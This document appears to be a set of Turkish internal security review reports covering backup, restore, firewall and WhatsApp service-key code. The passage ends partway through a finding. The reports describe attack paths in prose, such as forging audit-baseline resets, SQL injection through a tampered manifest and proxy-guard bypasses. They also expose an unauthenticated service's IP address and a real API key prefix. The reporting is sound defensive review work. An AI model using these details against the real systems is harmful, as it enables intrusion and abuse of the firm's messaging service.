# Güvenlik Raporu — P13b kod turu 2 (2026-11-15)

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 6 (yeni) — tur 1'den açık: S-P13b-4 (kısmen), S-P13b-5 (Düşük, runbook)

Kapsam: commit edilmemiş çalışma ağacı; `docs/implementation.md` "P13b — devops düzeltme turu 1" ve "P13b — backend/frontend, WhatsApp
servis anahtarı (S-P13b-3)". İncelenen: `deploy/backup/{backup.sh,lib-audit.sh,lib-offsite.sh,lib.sh,restore.sh,lib-restore.sh}`,
`deploy/ops/proxy-guard.sh`, `deploy/ops/remote-watch.sh`, `apps/server/src/{notify/whatsapp.ts,settings/system.ts,settings/routes.ts,
audit/mask.ts,lib/logger.ts,env.ts}`, `packages/contracts/src/api/system-settings.ts`, migration `20261115090000_whatsapp_api_key`,
`apps/web/app/(panel)/admin/settings/whatsapp/whatsapp-form.tsx`. Staging'e bağlanılmadı, ACCESS.txt okunmadı, dind kullanılmadı,
kod değiştirilmedi. Not: tur sınırı nedeniyle `test-backup*.sh` / `test-proxy-guard.sh` yeniden çalıştırılmadı (devops sonuçları 55/55, 34/34 kabul edildi).

## Tur 1 maddelerinin durumu

| Kimlik   | Önem  | Durum                                   | Kanıt                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| -------- | ----- | --------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| S-P13b-1 | Orta  | KAPANDI                                 | `lib-audit.sh:80-87`: sıfırlama yalnız `baseline.at > P.measuredAtUtc` **ve** `BACKUP_DIR/audit-baseline-reset.json` root 600 normal dosya (`lib.sh:171 file_root_600`, symlink reddi) **ve** `işaret.id = baseline.id` ise uyarı; aksi `FAILED taban-cizgisi-isaretsiz`. İşaret imzalı manifeste girer, tüketilir (`backup.sh:281`). DB satırı tek başına yetmiyor. `offsite_normalize` işarete dokunmuyor (644 → 600 yükseltme yolu kapalı). Kalan pencere → S-P13b-10, S-P13b-11.                                                                  |
| G-P13b-3 | Orta  | KAPANDI (kalan risk gerekçeli)          | `proxy-guard.sh:72-83`: `inet remote_proxy_guard` output, priority filter (DNAT'tan sonra), `tcp dport 4451`, hedef `127.0.0.0/8,172.30.0.0/24` + `::1`, `meta skuid != {root,www-data}` → RST. Docker-proxy (127.0.0.1), DNAT yolu ve doğrudan 172.30.0.2 kapsanıyor; IPv4-mapped IPv6 soketler IPv4 paketi üretir, kural yakalar; rootless konteyner/slirp kullanıcı uid'iyle bağlanır → red. Başka bridge'deki konteynerler FORWARD'dan geçer ve kaynakları .128 değildir (güvenilmez). Kalan: www-data (belgelenmiş, `check` UYARI) ve S-P13b-12. |
| S-P13b-2 | Düşük | KAPANDI                                 | `restore.sh:74-78` manifest+imza 700 `mktemp -d` kopyasına alınıp tüm okumalar kopyadan; `:108-111` `M_RUN/M_ENV/M_HOST/M_SEQ` sıkı desen, `:114` tablo adları.                                                                                                                                                                                                                                                                                                                                                                                       |
| S-P13b-3 | Orta  | KOD KAPANDI (servis tarafı kullanıcıda) | `x-api-key` desteği aşağıda incelendi. `git grep 89.252.189.211` → yalnız `docs/guvenlik-raporu.md` (eski turlar, 9 satır); diğer dokümanlardan temizlenmiş. Servisin anahtarı fiilen zorlaması ayrı projede doğrulanmalı (repo public öncesi).                                                                                                                                                                                                                                                                                                       |
| S-P13b-4 | Düşük | KISMEN                                  | `remote-watch.sh:231` `\( -perm -0020 ! -group 0 \)` eklendi. Yedek biriminin kurulu kopyadan çalışması → Sonra (implementation.md).                                                                                                                                                                                                                                                                                                                                                                                                                  |
| S-P13b-5 | Düşük | AÇIK (runbook, T5)                      | Kod değişikliği gerekmiyor; runbook notu bekleniyor.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| S-P13b-6 | Düşük | KAPANDI                                 | `lib-offsite.sh:63-79` `OFFSITE_OPEN` + `backup.sh:68 on_exit → offsite_close`; SIGKILL için yalnız run dizinlerini normalleştiren `offsite_normalize`.                                                                                                                                                                                                                                                                                                                                                                                               |

## Bulgular (öncelik sırasıyla)

### [DÜŞÜK] S-P13b-7 Yeni sahte test anahtarları gitleaks `generic-api-key`e takılıyor — commit edilince CI gitleaks işi kırmızı — A05 (süreç)

Yer: `apps/server/test/integration/whatsapp-admin-p12b.test.ts:399` (`ENV_KEY`), `apps/server/test/unit/whatsapp-runtime-p12b.test.ts:144` (`KEY`),
`apps/web/e2e/p12b-whatsapp.spec.ts:256` (`apiKey`). `.github/workflows/ci.yml:175-178` tüm geçmişi `--exit-code 1` ile tarar.
Sorun: Değerler sahte (gerçek anahtar öneki `git grep` ile 0) ama yüksek entropili (4,2–4,4), `.gitleaks.toml` allowlist'inde değil.
İstismar senaryosu: Güvenlik açığı değil; commit sonrası CI kırılır, aceleyle geniş bir allowlist eklenirse (ör. bütün `test/` dizini)
gerçek bir sızıntı da gizlenir.
Düzeltme: Sahte anahtarlar tek kaynağa, allowlist'teki `apps/server/test/helpers/secrets.ts`'e taşınır (web e2e için düşük entropili
belirgin sahte değer, ör. `test-only-wa-key-0000000000`). Yeni dosya yolu ya da dizin allowlist'e eklenmez. **Commit öncesi kapanmalı.**
Sahip: backend-dev (server testleri), frontend-dev (e2e).

### [DÜŞÜK] S-P13b-8 Servis anahtarı `http://` üzerinden düz metin gönderilebiliyor — A02

Yer: `apps/server/src/notify/whatsapp.ts:65-71` (`isInsecureServiceUrl`: production'da yalnız http + **özel olmayan** adres kapalı;
development/test'te her şey serbest), `:308` (başlık koşulsuz eklenir).
Sorun: Production'da `http://10.x/172.16.x/192.168.x/127.x` adreslerine ve geliştirme ortamında herhangi bir `http://` adrese `x-api-key`
şifresiz gider. Staging compose `NODE_ENV=production` olduğundan genel IP'ye http zaten kapalı (iyi); risk özel ağ/VPN yolunda.
İstismar senaryosu: Aynı LAN/VPN segmentinde pasif dinleme yapan biri anahtarı yakalar ve firmanın numarasından toplu mesaj gönderir.
Düzeltme: Anahtar tanımlıysa `http://` yalnız loopback ya da compose iç ağı (ör. 172.30.0.0/24) için kabul edilir, aksi hâlde kanal
`insecure` sayılır (ayar ekranında mevcut uyarı). Servis tarafında TLS (vekil) önerisi U1'le birlikte. Sahip: backend-dev; servis: kullanıcı.

### [DÜŞÜK] S-P13b-9 Anahtar şeması yazdırılabilir ASCII'yi zorlamıyor — A04 / A05

Yer: `packages/contracts/src/api/system-settings.ts:181` `WA_API_KEY_RE = /^[^\s\p{Cc}]+$/u`.
Sorun: U+0100 ve üstü karakterler ile `\p{Cf}` (ör. kopyala-yapıştırla gelen U+200B) kabul edilir. Kaydedilen anahtarla her istek
`fetch` içinde `TypeError: Cannot convert argument to a ByteString` atar (yerelde doğrulandı); sonuç `unreachable` olur, kanal sessizce
çalışmaz ve teşhis yanlış yönlendirir. 0x80–0xFF ise ham Latin-1 bayt olarak gider. Değer loga yazılmıyor (yalnız `err.name`) — sızıntı yok.
Düzeltme: `^[\x21-\x7E]+$` (16–256). env ve panel aynı şemayı kullandığı için tek değişiklik yeterli. Sahip: backend-dev.

### [DÜŞÜK] S-P13b-10 Kabul edilen taban çizgisi sıfırlamasında gün özeti karşılaştırması hiç yapılmıyor — A09

Yer: `deploy/backup/lib-audit.sh:80-87` (sıfırlama dalı, `$bad` hesabından önce döner).
Sorun: Tur 1'deki iki düzeltme önerisinden ikincisi (host işareti) uygulandı; birincisi (sıfırlamada da karşılaştır, farkı alarm metnine yaz)
uygulanmadı. Önceki ölçüm ile meşru sıfırlama arasındaki kurcalama görünmez kalır.
İstismar senaryosu: migrator ele geçirilmiş, operatörün elle (restore dışı) `--reset-audit-baseline` çalıştıracağı biliniyor
(ör. bir önceki alarm sonrası). Saldırgan sıfırlamadan önce audit satırlarını değiştirir; işaret eşleştiği için sonuç "uyarı" olur.
Restore sonrası etkisi yok (veri zaten yedekten gelir).
Düzeltme: Sıfırlama dalında da `$bad`/`maxId` farkı hesaplanır; sonuç değişmez ama alarm metnine `fark: gun=…` eklenir, operatör görür.
Sahip: devops.

### [DÜŞÜK] S-P13b-11 `--reset-audit-baseline` yedek kilidini almıyor; işaret yol bazlı siliniyor — A04 (yarış)

Yer: `deploy/backup/backup.sh:55-58` (kilit `:116`'dan önce çıkar), `:281` `rm -f -- "$(baseline_marker_path)"`.
Sorun: Yedek A sıfırlama id=5'i kabul ettikten sonra operatör id=6 sıfırlaması yaparsa, A'nın `rm -f`'i yeni işareti siler; sonraki yedek
`FAILED taban-cizgisi-isaretsiz` verir. Fail-safe (yanlış alarm), ama runbook "olay müdahalesi" der → gereksiz müdahale.
TOCTOU (izin denetimi → `jq` okuma) istismar edilemez: BACKUP_DIR root 700 (kanca sırasında 710, grup yazamaz).
Düzeltme: Reset komutu aynı `LOCK_DIR`'i alır; silmeden önce dosyadaki `id` kabul edilen id ile karşılaştırılır. Sahip: devops.

### [DÜŞÜK] S-P13b-12 proxy-guard kalan pencereleri — A01

Yer: `deploy/ops/proxy-guard.sh:72-83`, `:128-142` (unit).
Sorun: (a) `root` izinli: `docker` grubundaki herhangi bir kullanıcı `--network host` ile root konteyner açıp atlatır (root eşdeğeri
yetki; kabul edilebilir ama runbook'ta yazılı değil). (b) Ubuntu `nftables.service` yeniden başlatılırsa `/etc/nftables.conf` içindeki
`flush ruleset` tabloyu siler; timer ≤5 dk sonra onarır. (c) Servis `Before=docker.service` içermez; açılışta kısa korumasız pencere.
Düzeltme: runbook'a (a) notu; unit'e `Before=docker.service`, `PartOf=nftables.service` (ya da `/etc/nftables.d` include); Sahip: devops (T5).

## İncelenen ve temiz bulunanlar (yeni kod)

- **SSRF ile anahtar sızması:** env anahtarı yalnız env adresine (`system.ts effectiveWhatsappTarget`), panel anahtarı yalnız panel adresine;
  köken (şema+host+port) değişirken anahtar verilmezse 400 `WA_API_KEY_REENTER`; şifreli değer AAD'si kökene bağlı (`crypto.ts:21`), başka
  köken altında çözülemez. `redirect: "manual"` → 3xx hedefine başlık gitmez. Node `fetch` env proxy kullanmaz. http→https ya da tersi de
  yeniden giriş ister. Sadece DNS düzeyinde ana bilgisayar ele geçirme kapsam dışı.
- **Yanıt/log/audit:** `getWhatsappSettings` yalnız `apiKeySet/apiKeySource`; log `keySet` boolean + `*.apiKey` redakte; hata logunda yalnız
  `err.name`; audit `apiKey: "***"` (`MASK`) + izinli `apiKeySet/apiKeyChanged` boolean (yalnız sunucu üretir). `maskValue` `key` kalıbı
  savunma katmanı olarak da maskeler.
- **Zamanlama:** `prevKey === input.apiKey` sabit zamanlı değil ama yalnız Super Admin çağırır ve yanlış tahmin anahtarı ezer — tekrarlanabilir
  oracle yok. Test ucunun `unauthorized` yanıtı tasarım gereği (hız sınırlı).
- **Durum tutarlılığı:** `setUrl(url, key)` adres ve anahtarı aynı senkron adımda atar; yeniden denemeler her zaman eşleşen çifti kullanır;
  PUT/DELETE `waSerial` ile sıralı; 401'de yeniden deneme yok.
- **Frontend:** anahtar `autoComplete="new-password"`, geri yazılmıyor, depolama/konsol yok; kaldırma kayıtlı adresle gider.
- **Migration:** CHECK yalnız `url` null iken `secret_enc` NULL zorlar; uzunluk genel kuralla. Yetki değişmedi.

## Otomatik tarama çıktıları

- `gitleaks dir` (çalışma ağacı, untracked dahil; v8.30.1, repo `.gitleaks.toml`): **16 bulgu, rc 1**. 13'ü `apps/web/.next/**`
  (derleme çıktısı, `.gitignore`'da; hariç tutuldu). **3'ü kaynakta**: yukarıdaki S-P13b-7 sahte test anahtarları (gerçek sır değil).
- `gitleaks git --staged`: staged dosya 0 → "no leaks found". `gitleaks git` (yerel geçmiş): 48 commit, "no leaks found".
- `git grep -n -- "-H4Nl0la5"` (gerçek anahtar öneki): **0**. Ek: `--cached` 0, untracked dahil çalışma ağacı 0, `apps/web/.next` 0.
  `deploy/.env` ve `.env` `.gitignore`'da (`git check-ignore` doğrulandı).
- `git grep 89.252.189.211`: 9 satır, yalnız `docs/guvenlik-raporu.md` (eski turlar).
- `npm audit`: yeni bağımlılık yok; çalıştırılmadı.

## Tasarımda vaat edilip kodda bulunmayanlar

- S-P13b-4 yedek birimi kurulu kopya kalıbı (Sonra).
- S-P13b-1 düzeltmesinin "sıfırlamada da karşılaştır" seçeneği (S-P13b-10).
- WhatsApp servisinin anahtarı fiilen zorlaması (ayrı proje; repo public öncesi kullanıcı doğrulamalı).

## Olumlu

- Taban çizgisi artık host'taki root 600 kanıtına bağlı; işaret imzalı manifeste kopyalanıyor; restore aynı tek kod yolunu kullanıyor;
  644 işareti 600'e "iyileştiren" normalleştirme hatasını devops testi yakalayıp daraltmış.
- proxy-guard: ayrı tablo, atomik `nft -f`, imzalı yorumla sapma denetimi, kurulu kopya + root 0644 conf doğrulaması, olumsuz testler.
- Anahtar tasarımı (köken bağlı AAD + yeniden giriş zorunluluğu) MySQL B-P11-1 kalıbını doğru uygulamış.

## Önerilen "Sonra" (gereksinimler §9)

S-P13b-8, S-P13b-9, S-P13b-10, S-P13b-11, S-P13b-12. **S-P13b-7 Sonra'ya bırakılmaz: commit öncesi.**

---

# Güvenlik Raporu — P13b kod turu (2026-11-15)

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 3 / Düşük 5

Kapsam: commit edilmemiş çalışma ağacı (`git diff` + yeni dosyalar): `deploy/backup/{backup.sh,restore.sh,lib.sh,remote-backup.service,backup.env.example}`,
`deploy/mysql/{audit-continuity,audit-baseline-reset,restore-reset-db,restore-sec-snapshot,checksum-tables}.sql`, `deploy/turn/{cert-deploy-hook.sh,host-firewall.sh,docker-compose.yml}`,
`deploy/ops/*`, `deploy/Caddyfile`, `apps/server/src/{cli/reset-superadmin.ts,auth/superadmin-reset.ts,auth/service.ts,signaling/active.ts,env.ts,settings/*}`.
Staging'e bağlanılmadı, ACCESS.txt okunmadı, dind kullanılmadı, kod değiştirilmedi.

## Tasarım turu bulgularının durumu

| Kimlik    | Önem   | Durum                                | Kanıt                                                                                                                                                                                                                                                   |
| --------- | ------ | ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| G-P13b-1  | Yüksek | KAPANDI                              | `active.ts` `grant()` oda başına önbellek, yalnız yenilemede `fresh`; `TURN_BPS_CAPACITY=0` + `host-firewall.sh` 3 aggregate `hashlimit` kuralı; 63. allocation ölçümü implementation.md'de. `turn_allocations` alarmı Sonra.                           |
| G-P13b-2  | Yüksek | KOD KAPANDI, kalan → S-P13b-3 (Orta) | `env.ts` varsayılan adres kaldırıldı (boş → kanal kapalı); compose `${WHATSAPP_SERVICE_URL:-}`; `.env.example`/`backup.env.example` yer tutucu; gitleaks tüm geçmiş temiz.                                                                              |
| G-P13b-3  | Orta   | AÇIK → aşağıda                       | `skuid` kuralı / nginx sır başlığı yok (`grep -r skuid deploy` boş).                                                                                                                                                                                    |
| G-P13b-4  | Orta   | KAPANDI                              | `cert-deploy-hook.sh`: git dışı `/etc/remote/turn-certs` root:65533 0750, `safe_dir` (symlink/sahip/g-o yazma, bütün üstler), `safe_target`, `mktemp` + `chown -h`/`chmod` içerikten önce, `mv -fT`, lineage tam eşitlik, kurulu kopya env'i yok sayar. |
| G-P13b-5  | Orta   | KAPANDI, yeni zayıflık → S-P13b-1    | Sıralı SHA-256 gün özetleri + `tail`/`prevTail`, tetikleyici gövde özeti, `instanceId`/env/host/db eşlemesi.                                                                                                                                            |
| G-P13b-6  | Orta   | KAPANDI                              | `backup.sh:418-423` `timeout -k 60` + `setpriv --reuid/--regid --clear-groups --inh-caps=-all --bounding-set=-all --no-new-privs` + `env -i`; uid/gid 0 reddi; süre bütçesi; `TimeoutStartSec=2h`.                                                      |
| G-P13b-7  | Orta   | KAPANDI                              | `lib.sh:181` `cmd_has_inline_secret` (alert + offsite), `remote-watch.sh:238`; mesaj env/stdin ile; `curl -K` örnekleri.                                                                                                                                |
| G-P13b-8  | Orta   | KAPANDI (kalan risk → S-P13b-5)      | `verify_manifest_sig` find-principals + verify `-Overify-time`; dizin adı = `manifest.run`, `seq`/`prevRun`, daha yeni yedek uyarısı, prod'da `ESKI-<run>` onayı.                                                                                       |
| G-P13b-9  | Düşük  | KAPANDI (runbook notu T5'e)          | implementation.md T1 "G-P13b-9" adımları.                                                                                                                                                                                                               |
| G-P13b-10 | Düşük  | KISMEN                               | 24 sa süre `auth/service.ts` (parola doğrulandıktan sonra, oracle yok); bant dışı bildirim Sonra.                                                                                                                                                       |
| G-P13b-11 | Düşük  | Kullanıcı (U1)                       | Telegram birincil kanal örneği.                                                                                                                                                                                                                         |
| G-P13b-12 | Düşük  | KAPANDI                              | Ölçüm allocation başına; AC metni proje-yöneticisinde.                                                                                                                                                                                                  |
| G-P13b-13 | Düşük  | KISMEN → S-P13b-4                    | `remote-watch` ve hook kurulu kopyadan; yedek birimi hâlâ git ağacından.                                                                                                                                                                                |

## Bulgular (öncelik sırasıyla)

### [ORTA] S-P13b-1 Audit taban çizgisi sıfırlaması DB'den taklit edilebilir; FAILED yalnız "uyarı"ya düşer — A09

Yer: `deploy/backup/backup.sh:242-247` (baseline kontrolü karşılaştırmadan ÖNCE), `deploy/mysql/audit-continuity.sql` `baseline` alanı,
`deploy/mysql/audit-baseline-reset.sql` başlığı ("app aynı action'ı yazabilir").
Sorun: Taban çizgisi sıfırlaması, `audit_logs`'a `action='backup.audit_baseline_reset'` satırı eklenmesiyle tanınır. `audit_logs` INSERT yetkisi
olan her hesap (app, migrator) bu satırı yazabilir. Bu satır önceki ölçümden sonra eklenirse `backup.sh` gün/tail karşılaştırmasını hiç yapmaz,
`taban-cizgisi-sifirlandi` (uyarı, `audit_continuity_ok=1`) yazar.
İstismar senaryosu: migrator kimliğini ele geçiren biri tetikleyiciyi düşürür, audit satırlarını değiştirir ya da siler, tetikleyiciyi aynı
gövdeyle yeniden kurar (`triggers.ok` geçer) ve sahte bir `backup.audit_baseline_reset` satırı ekler. Gece yedeği FAILED yerine
"taban çizgisi elle/geri yüklemeyle sıfırlandı (uyarı)" mesajı gönderir. Operatör bunu rutin kabul eder ve kurcalama görünmez kalır.
Düzeltme:

- Sıfırlama durumunda da karşılaştırma YAPILIR, fark listesi alarm metnine yazılır. Fark varsa sonuç `FAILED+baseline` olur ve meşru
  sıfırlama operatörün incelemesine kalır.
- Ya da sıfırlama host tarafına bağlanır: `backup.sh --accept-audit-baseline <run>` root komutuyla, `BACKUP_DIR`'e root 600 imzalı bir
  işaret dosyası yazılır. DB satırı tek başına yeterli sayılmaz. `restore.sh` de bu işareti kendisi yazar.
- `baseline` satırının `user_agent='audit-baseline-reset-sql'` ve `username='cli'` olması denetlenir (savunma derinliği; tek başına yetmez).
- Sahip: devops (backup.sh), dba (audit-baseline-reset.sql / kural metni).

### [ORTA] G-P13b-3 (açık) 127.0.0.1:4451'e yerel süreçler sahte X-Forwarded-For verebilir — A01 / A07

Yer: `deploy/docker-compose.yml:174`, `deploy/Caddyfile:48-50` (`trusted_proxies static 172.30.0.128/32`).
Sorun: Tasarım turundan beri değişmedi. backend payı yok (gerekçe doğru), devops payı T1/T5'e ertelenmiş, kodda karşılığı yok. Prod'da VM
başka sitelerle paylaşıldığından IP bazlı giriş/sıfırlama limitleri ve audit `ip_address` aynı host'taki herhangi bir süreç tarafından
atlatılabilir.
Düzeltme: `nftables`/`iptables` OUTPUT `-o lo -p tcp --dport 4450:4451 -m owner ! --uid-owner www-data,root -j REJECT` (`host-firewall.sh`
kalıbında kurulu birim + olumsuz test) ya da nginx sabit sır başlığı + Caddy 4451'de başlıksız istek 403. Prod açılışından önce kapanması
önerilir. Sahip: devops (T5).

### [ORTA] S-P13b-3 (G-P13b-2 kalanı) Kimliksiz WhatsApp servis adresi dokümanlarda ve geçmişte duruyor — A05

Yer: `git grep -n 89.252.189.211` → `README.md:672`, `docs/gereksinimler-kabul-kriterleri-e9.md:41`, `docs/mimari.md:352`,
`docs/mimari-e9.md:18,262`, `docs/runbook.md:81,727,1305`, `docs/implementation.md:3958,4245`, `docs/guvenlik-raporu.md` (eski turlar).
Kod, örnek env ve `check-app-grants.sh` dosyalarında artık geçmiyor.
Sorun: Adres git geçmişindeki eski commit'lerde (`env.ts`, `.env.example`) de var. Dokümanlardan silmek geçmişteki görünürlüğü
kaldırmaz. Asıl risk servisin kimliksiz olmasıdır: repo public olunca herkes firmanın numarasından mesaj gönderebilir.
Düzeltme: Repo public yapılmadan **önce** U1/G-P13b-11 tamamlanır: servise API anahtarı (ya da TLS + kimlik doğrulamalı vekil + hız
sınırı) eklenir veya adres değiştirilir. Belgelerdeki adres yer tutucuyla değiştirilir (`http://<whatsapp-servis>:3000`). Geçmiş yeniden
yazılmaz. Sahip: kullanıcı (servis), teknik-yazar + mimar (dokümanlar).

### [DÜŞÜK] S-P13b-2 restore.sh doğrulanmış manifesti tekrar diskteki yoldan okur (TOCTOU); `manifest.run` SQL metnine doğrulanmadan girer — A08

Yer: `deploy/backup/restore.sh:87` (imza `$MANIFEST` üzerinde), sonra `:97-101`, `:160`, `:171`, `:179`, `:258-268` (`jq ... "$MANIFEST"`),
`:337` (`printf "SET @rs_reason = '%s'" "restore $M_RUN ..."`).
Sorun: İmza doğrulandıktan sonra manifest her `jq` çağrısında `RUN_DIR`'den yeniden okunur. `:101`'de tablo adları doğrulanır ama
`:266`'daki SQL sorgusu manifesti yeniden okuyarak kurulur. `RUN_DIR`'e yazabilen biri (site dışından indirilen ve kullanıcıya ait bir
dizin, iş istasyonu) doğrulamadan sonra manifesti değiştirebilir. Bu durumda migrator ile çalışan SQL'e tanımlayıcı/ifade enjekte edilebilir.
`M_RUN` biçim olarak denetlenmeden `@rs_reason` dizesine girer (dizin adı run biçiminde değilse yalnız uyarı verilir).
Düzeltme: Doğrulamadan önce manifest ve imza `WORK`'e (700) kopyalanır. Doğrulama ve sonraki bütün okumalar bu kopyadan yapılır.
`M_RUN` `^[0-9]{8}T[0-9]{6}Z$` ile, `M_ENV`/`M_HOST` dar desenle doğrulanır. Sahip: devops.

### [DÜŞÜK] S-P13b-4 (G-P13b-13 kalanı) Yedek birimi root olarak git ağacından çalışıyor; ağaç denetimi grup yazmayı görmüyor — A08

Yer: `deploy/backup/remote-backup.service` `ExecStart=/opt/remote/deploy/backup/backup.sh` (lib.sh ve `../mysql/*.sql` de ağaçtan);
`deploy/ops/remote-watch.sh:230-231` (`-perm -0002 -o ! -user 0`).
Sorun: `remote-watch` ve sertifika hook'u kurulu kopya kalıbına geçti, yedek tarafı geçmedi. `tree-perms` denetimi root sahipli ama
root olmayan bir gruba yazılabilir (`g+w`) dosyaları yakalamıyor.
Düzeltme: `backup.sh`, `restore.sh`, `lib.sh` ve SQL dosyaları `install` ile `/usr/local/lib/remote/backup/` altına root 0755/0644 kurulur.
Ya da `tree-perms` `\( -perm -0020 ! -group 0 \)` koşulunu da kapsar. Sahip: devops (T5).

### [DÜŞÜK] S-P13b-5 `-Overify-time` imzalı `createdUtc`'yi kullanır; anahtar sızıntısında geriye tarihli sahte yedek doğrulanır — A08

Yer: `deploy/backup/lib.sh:205-210`; runbook rotasyon notu ("sızıntıda `valid-before=<sızma anı>`").
Sorun: Doğrulama zamanı, imzalayanın kendi yazdığı `createdUtc` alanından gelir. Sızan anahtarla imzalanan ve `createdUtc` değeri
sızma anından önceye ayarlanan bir manifest `valid-before` sınırını geçer. Production'da 48 saat yaş onayı ikinci bir engeldir;
staging'de bu engel de yok.
Düzeltme: Runbook'a yazılır: sızıntıda eski satır `valid-before` ile bırakılmaz, **silinir**. Sızıntı öncesi yedekler yalnız ayrı, kasada
saklanan ve tarih penceresi elle doğrulanan `allowed_signers` kopyasıyla yüklenir. Sahip: devops (T5), mimar (ADR-0020 notu).

### [DÜŞÜK] S-P13b-6 Kanca sırasında süreç öldürülürse çalıştırma dizini grup-okunur kalır — A05

Yer: `deploy/backup/backup.sh:415-425` (izin geri alma `on_exit` trap'inde değil).
Sorun: Birim zaman aşımı ya da SIGKILL kanca sırasında gelirse `BACKUP_DIR` 710, run 750 ve dosyalar 640 (grup `remote-offsite`)
olarak kalır. İçerik age ile şifreli olduğu için etkisi düşüktür.
Düzeltme: Geri alma `on_exit` içine taşınır (`OFFSITE_OPEN=1` bayrağıyla) ya da bir sonraki çalıştırma başında `chmod 700` +
`chmod 600` ile normalleştirilir. Sahip: devops.

## Otomatik tarama çıktıları

- `docker run --rm -v "$PWD:/repo" -w /repo zricethezav/gitleaks:v8.30.1 git --no-banner --redact --config /repo/.gitleaks.toml`
  → **48 commit, ~9,8 MB, "no leaks found", rc 0**. Not: bu mod yalnız yerel ref'leri tarar (G-P13b-2'deki `--mirror` klon önerisi geçerli).
- Ek: `gitleaks dir` (çalışma ağacı, commit edilmemiş dosyalar dahil) → 13 bulgu, **hepsi** `apps/web/.next/**` (Next.js
  `preview-props.json`, `prerender-manifest.json` vb. derleme çıktısı), hepsi `.gitignore`'da (`git check-ignore` doğrulandı). Repoya girmez.
- `git grep -n "89.252.189.211"`: kod/örnek env dosyalarında **0**. Yalnız dokümanlarda: README.md:672, docs/gereksinimler-kabul-kriterleri-e9.md:41,
  docs/mimari.md:352, docs/mimari-e9.md:18,262, docs/runbook.md:81,727,1305, docs/implementation.md:3958,4245, docs/guvenlik-raporu.md (eski turlar) → S-P13b-3.
- `npm audit` / `govulncheck`: P13b'de yeni bağımlılık yok; çalıştırılmadı.

## Tasarımda vaat edilip kodda bulunmayanlar

- G-P13b-3 düzeltmesi (yukarıda).
- G-P13b-13 yedek tarafında kurulu kopya kalıbı (S-P13b-4).
- G-P13b-10 bant dışı bildirim (Sonra; `remote-watch` `auth.superadmin_reset` sayacı ya da sarmalayıcı betik).
- G-P13b-1 `turn_allocations > 2×active+10` alarmı (Sonra).

## Olumlu

- İmza her şeyden önce yapılır, atlama seçeneği yok. Şifreli sha256 → çözme → düz sha256 sırası, takas edilmiş şifreli dosyayı da yakalar.
- Ortam kilidi çözmeden önce uygulanır (`deploy/.env` DEPLOY_ENV = hedef = manifest.env, `--confirm db@host`, root, compose projesi,
  prod'da host + TTY + `PRODUCTION-<host>`). Ortam değişkeni DEPLOY_ENV'i ezemez.
- Canlıda root yalnız salt okunur anlık görüntü için kullanılır. Reset ve yükleme migrator ile, `--system-command=OFF --local-infile=0`.
  Guard'lar `CHECK` kısıtlı geçici tabloyla yapılır, `mysql` batch modu ilk hatada durur. `anon=0`/`migratorExtra=0` önkoşulu var.
  CHECKSUM canlı = scratch.
- `audit-continuity.sql`: XOR yerine sıralı SHA-256 seçilmiş. Tetikleyici gövdesi ve DEFINER özetleniyor. Kesik özet (`h=null`) FAILED sayılıyor.
- Kanca: setpriv ile bütün yetenekler düşürülüyor, `env -i`, root/uid 0 reddediliyor, komut metni loglanmıyor; testte imza anahtarı ve
  `deploy/.env` okunamadı.
- `cert-deploy-hook.sh` G-P13b-4'ün bütün maddelerini karşılıyor; olumsuz testler (symlink dizin/dosya, g+w üst dizin, benzer lineage) mevcut.
- `remote-watch`: kurulu kopya, watch.env root 600 zorunlu, `source` yok, sır deseni reddi, mesaj stdin'den.
- CLI: TTY yoksa DB'ye bağlanmıyor, parola yalnız stdout TTY'ye bir kez yazılıyor, audit'te parola yok, koşullu UPDATE TX içinde.
  Süre dolumu mesajı yalnız doğru parolayla görünüyor.
- HSTS `max-age=31536000; includeSubDomains` (preload yok) hem helmet'te hem Caddy'de. `trustProxy` 172.30.0.2/31, server portu yayımlanmıyor.
- WhatsApp: boş adres → gönderim yok, testler sabit "yapılandırılmamış" yanıtı; yerleşik varsayılan kaldırıldı.
  Bilgi: `whatsapp-form.tsx:154,184` "default" dalı ölü kod (frontend-dev temizleyebilir).

## Önerilen "Sonra" maddeleri (`docs/gereksinimler.md` §9)

S-P13b-4/5/6, G-P13b-10 bant dışı bildirim, `turn_allocations` alarmı. S-P13b-1 ve G-P13b-3'ün prod açılışından önce kapanması önerilir.

---

# Güvenlik Raporu — P13b tasarım turu (2026-11-14)

DURUM: DÜZELTİLMELİ (tasarım; kod henüz yok)
Özet: Kritik 0 / Yüksek 2 / Orta 6 / Düşük 5

Kapsam: `docs/mimari-p13.md` §7.1–7.17, ADR-0018/0019/0020, ADR-0007 r6, `docs/tasarim-kontrol.md` P13b tablosu. Mevcut
durum için okunanlar: `deploy/backup/{backup.sh,restore.sh,lib.sh,*.service,*.timer,backup.env.example}`,
`deploy/turn/{docker-compose.yml,turnserver.base.conf,entrypoint.sh}`, `deploy/Caddyfile`, `deploy/docker-compose.yml`,
`deploy/nginx/remote.noktabilisim.net.conf`, `apps/server/src/signaling/{turn,active}.ts`, runbook §8, §9, §18.
Sunucuya/staging'e bağlanılmadı, ACCESS.txt okunmadı, kod değiştirilmedi.

## Bulgular (öncelik sırasıyla)

### [YÜKSEK] G-P13b-1 `bps-capacity` rezervasyonu eşzamanlı allocation sayısını ~62'ye indirir; kabul edilmiş müşteri TURN'ü tüketebilir — A04 / kullanılabilirlik

Yer: `docs/mimari-p13.md` §7.4 (`TURN_BPS_CAPACITY=62500000`, `TURN_MAX_BPS=1000000`, `total-quota=300`); ADR-0018 m.2;
`apps/server/src/signaling/turn.ts:24-32` (her `hello`/yeniden bağlanmada yeni username).
Sorun:

- coturn `bps-capacity` ayarlıyken her yeni allocation için `max-bps` kadar bant **rezerve eder** (`allocate_bps`). Kalan kapasite
  bitince yeni allocation "Allocation Bandwidth Quota Reached" ile reddedilir. 62.500.000 / 1.000.000 = **62 allocation**. Oturum
  başına 6 allocation ile bu ~10 eşzamanlı oturum demektir; S4 (50 oturum) ve `total-quota=300` hesabı geçersiz olur.
- Birim düzeltmesi (8.000.000 → 1.000.000) doğru, ama kapasiteyle birlikte düşünülmemiş.
